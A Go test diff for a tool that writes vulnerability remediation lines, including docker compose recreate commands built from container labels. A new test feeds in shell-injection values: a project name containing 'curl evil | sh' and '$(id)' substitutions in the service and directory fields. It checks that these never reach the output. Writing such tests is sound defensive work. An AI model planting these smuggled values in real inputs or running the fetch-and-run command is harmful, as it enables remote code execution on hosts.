@@ -23,7 +23,7 @@ func remediationInventory() *inventory.Inventory {
 			{ID: "proc:php", Kind: inventory.KindProcess, Name: "php-fpm8.2", Units: []string{"php8.2-fpm.service"}, Origins: []string{libsslID}},
 			{ID: "proc:shop", Kind: inventory.KindProcess, Name: "node", Units: []string{"shop.service"}, Origins: []string{libsslID, "appdir:/srv/shop"}},
 			{ID: "proc:api", Kind: inventory.KindProcess, Name: "api", Units: []string{"user@1000.service"}, Origins: []string{apiID, libsslID}},
-			{ID: "container:shop-web-1", Kind: inventory.KindContainer, Name: "shop-web-1", Compose: &inventory.Compose{Project: "shop", Service: "web"}, Origins: []string{imageID}},
+			{ID: "container:shop-web-1", Kind: inventory.KindContainer, Name: "shop-web-1", Compose: &inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop"}, Origins: []string{imageID}},
 			{ID: "container:cache", Kind: inventory.KindContainer, Name: "cache", Origins: []string{imageID}},
 		},
 		Origins: []inventory.Origin{
@@ -57,7 +57,7 @@ func TestRemediation(t *testing.T) {
 		{"binary", f(apiID, "golang.org/x/net", "v0.1.0", "fixed", "v0.17.0"), "Replace or rebuild /opt/api/api with golang.org/x/net v0.17.0 or later, then restart api."},
 		{"app directory, several fix versions", f("appdir:/srv/shop", "minimist", "1.2.5", "fixed", "0.2.4", "1.2.6"), "Upgrade minimist in /srv/shop to 0.2.4 or 1.2.6, then restart shop.service."},
 		{"image, with and without Compose", f(imageID, "libssl3", "3.0.11-1~deb12u2", "fixed", "3.0.16-1~deb12u1"),
-			"Rebuild ghcr.io/acme/shop:2026.11.3 or pull a newer image with libssl3 3.0.16-1~deb12u1 or later, then recreate the container cache, shop-web-1 (docker compose -p shop up -d --force-recreate web)."},
+			"Rebuild ghcr.io/acme/shop:2026.11.3 or pull a newer image with libssl3 3.0.16-1~deb12u1 or later, then recreate the container cache, shop-web-1 (docker compose -p shop --project-directory /srv/shop up -d --force-recreate --no-deps web)."},
 	}
 	for _, c := range cases {
 		if got := r.line(c.f); got != c.want {
@@ -87,6 +87,41 @@ func TestRemediationKernelUpstreamAndArch(t *testing.T) {
 	r = newRemediation(osrel.Arch, inv)
 	if got, want := r.line(Finding{Origin: up, Fix: Fix{State: "fixed", Versions: []string{"7.3.5"}}}), "Upgrade the kernel to Linux 7.3.5 or later, then reboot."; got != want {
 		t.Errorf("got %s\nwant %s", got, want)
+	}
+}
+
+// The Compose labels can come from the image, so a name that breaks Compose's rules never reaches
+// the command, and the container is only named.
+func TestRemediationComposeUntrusted(t *testing.T) {
+	cases := []struct {
+		name string
+		c    inventory.Compose
+		want string
+	}{
+		{"shell in the project", inventory.Compose{Project: "x; curl evil | sh; true", Service: "web"}, "the container app"},
+		{"upper case project", inventory.Compose{Project: "Shop", Service: "web"}, "the container app"},
+		{"project starts with a dash", inventory.Compose{Project: "-shop", Service: "web"}, "the container app"},
+		{"shell in the service", inventory.Compose{Project: "shop", Service: "web$(id)"}, "the container app"},
+		{"service starts with a dot", inventory.Compose{Project: "shop", Service: ".web"}, "the container app"},
+		{"no service", inventory.Compose{Project: "shop"}, "the container app"},
+		{"directory with a space", inventory.Compose{Project: "shop_2", Service: "Web.1", WorkingDir: "/srv/my shop"},
+			"the container app (docker compose -p shop_2 up -d --force-recreate --no-deps Web.1)"},
+		{"relative directory", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "srv/shop"},
+			"the container app (docker compose -p shop up -d --force-recreate --no-deps web)"},
+		{"directory with shell", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/$(id)"},
+			"the container app (docker compose -p shop up -d --force-recreate --no-deps web)"},
+		{"plain directory", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop-2.0/c++_x"},
+			"the container app (docker compose -p shop --project-directory /srv/shop-2.0/c++_x up -d --force-recreate --no-deps web)"},
+	}
+	for _, c := range cases {
+		inv := &inventory.Inventory{
+			Items:   []inventory.Item{{ID: "container:app", Kind: inventory.KindContainer, Name: "app", Compose: &c.c, Origins: []string{imageID}}},
+			Origins: []inventory.Origin{{ID: imageID, Kind: inventory.OriginImage, Ref: "app:1"}},
+		}
+		got := newRemediation(osrel.Debian, inv).line(Finding{Origin: imageID, Package: Package{Name: "zlib"}, Fix: Fix{State: "fixed", Versions: []string{"1.3.1"}}})
+		if want := "Rebuild app:1 or pull a newer image with zlib 1.3.1 or later, then recreate " + c.want + "."; got != want {
+			t.Errorf("%s:\n got %s\nwant %s", c.name, got, want)
+		}
 	}
 }
 
